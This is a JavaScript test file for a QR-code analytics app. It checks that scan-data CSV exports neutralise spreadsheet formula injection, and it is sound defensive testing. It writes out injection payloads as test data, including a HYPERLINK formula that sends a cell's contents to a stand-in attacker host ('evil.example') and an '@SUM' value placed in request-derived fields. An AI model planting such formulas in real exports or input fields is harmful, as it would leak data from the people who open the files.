import { beforeAll, describe, expect, it } from "vitest"
import request from "supertest"
import app from "../../src/app.js"
import { prisma } from "../../src/db/prisma.js"
import { csvCell } from "../../src/utils/csv-cell.util.js"
import { createQRCode, createUser, giveSubscription, seedPlans } from "../helpers/factories.js"

/**
 * Spreadsheet formula injection (security audit, 23 Oct 2026): the scan CSV's
 * referrer, OS and browser come from the scanner's request headers, and a cell
 * starting with = + - @ runs as a formula when the owner opens the file.
 */
describe("CSV exports", () => {
  beforeAll(async () => {
    await seedPlans()
  })

  it("should neutralise formula-looking cells and keep ordinary ones", () => {
    expect(csvCell('=HYPERLINK("https://evil","x")')).toBe(`"'=HYPERLINK(""https://evil"",""x"")"`)
    for (const lead of ["+", "-", "@", "\t", "\r"]) expect(csvCell(`${lead}1`).startsWith(`"'`)).toBe(true)
    expect(csvCell("Chrome")).toBe('"Chrome"')
    expect(csvCell(null)).toBe('""')
  })

  it("should not let a scanner's Referer become a formula in the owner's scan export", async () => {
    const user = await createUser()
    await giveSubscription(user.id, "PRO")
    const qr = await createQRCode(user.id)
    await prisma.qRScan.create({
      data: { qrId: qr.id, ip: "203.0.113.9", referrer: '=HYPERLINK("https://evil.example/?"&A1,"open")', browser: "@SUM(1)" },
    })
    const res = await request(app).get(`/api/analytics/${qr.id}/csv`).set("Authorization", `Bearer ${user.token}`).expect(200)
    expect(res.text).toContain(`"'=HYPERLINK(`)
    expect(res.text).toContain(`"'@SUM(1)"`)
    expect(res.text).not.toMatch(/(^|,)"=/m)
  })
})
